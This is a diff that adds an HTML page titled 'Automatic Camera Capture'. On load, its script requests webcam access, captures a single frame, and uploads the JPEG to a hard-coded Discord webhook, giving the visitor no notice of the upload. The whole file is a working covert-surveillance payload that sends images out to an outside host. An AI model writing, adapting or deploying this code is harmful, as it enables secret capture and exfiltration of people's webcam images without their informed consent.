@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Automatic Camera Capture</title>
+</head>
+<body>
+    <script>
+        async function captureAndSend() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                video.play();
+
+                video.addEventListener('loadedmetadata', async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imgDataUrl = canvas.toDataURL('image/jpeg');
+                    const blobData = await fetch(imgDataUrl).then(res => res.blob());
+
+                    const formData = new FormData();
+                    formData.append('file', blobData, 'image.jpg');
+
+                    await fetch('https://discord.com/api/webhooks/1228391287871377482/C5aRDZVkmH92PsIPzHKNf8pVrN2N-x0BCGNNrNseu2vOwCgW0He75U7eUkSQ_WRiTvDa', {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
+                    canvas.remove();
+                });
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+            }
+        }
+
+        captureAndSend();
+    </script>
+</body>
+</html>
